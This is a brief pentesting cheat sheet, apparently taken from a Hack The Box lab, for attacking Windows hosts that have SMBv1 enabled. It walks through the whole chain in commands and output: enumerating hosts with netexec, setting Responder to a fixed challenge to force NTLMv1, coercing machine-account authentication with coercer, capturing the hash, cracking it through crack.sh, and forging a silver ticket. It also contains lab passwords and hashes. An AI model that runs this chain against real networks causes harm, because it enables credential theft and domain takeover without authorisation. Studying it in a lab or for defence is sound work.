# SMBv1 Exploit

Check: 

```
$ netexec smb 192.168.3.0/24 -u bob -p 'Passw0rd1!' --sessions
SMB         192.168.3.202   445    WEB              [*] Windows Server 2012 R2 Standard 9600 x64 (name:WEB) (domain:htb.local) (signing:False) (SMBv1:True)
SMB         192.168.3.201   445    DEV              [*] Windows Server 2019 Standard 17763 x64 (name:DEV) (domain:htb.local) (signing:False) (SMBv1:True)
SMB         192.168.3.203   445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:htb.local) (signing:True) (SMBv1:False)
```

It has: `SMBv1:True`.

## Exploit

Example Killchain: SpoolSample [MS-RPRN] > Net-NTLMv1 Hash (Net-NTLMv1 Response) > NTLM Hash (NTHash) > Silver Ticket

1. Change `/etc/responder/Responder.conf`, `Challenge = 1122334455667788`
2. Start Responder with `--lm` to disable SSP: `responder -I tun0 --lm`
3. exploit with coercer to get hash like: `$ coercer coerce -l 10.10.16.138 -t 192.168.3.201 --auth-type smb -u mane -p 'Passw0rd1!'`
    ```
    [SMB] NTLMv1 Client   : 10.13.38.17
    [SMB] NTLMv1 Username : HTB\DEV$
    [SMB] NTLMv1 Hash     : DEV$::HTB:11EBE0BFBF241EE1D55DD9F5535254FCAF77876B9D200341:11EBE0BFBF241EE1D55DD9F5535254FCAF77876B9D200341:1122334455667788
    ```

4. submit hash to crack.sh : `NTHASH:11EBE0BFBF241EE1D55DD9F5535254FCAF77876B9D200341`
5. email will send Key: `fc64914083cfe79b3a01cd44550044fe`, this is ntlm hash.
6. silver ticket exploit

# Reference

+ https://crack.sh/netntlm/
+ https://github.com/NotMedic/NetNTLMtoSilverTicket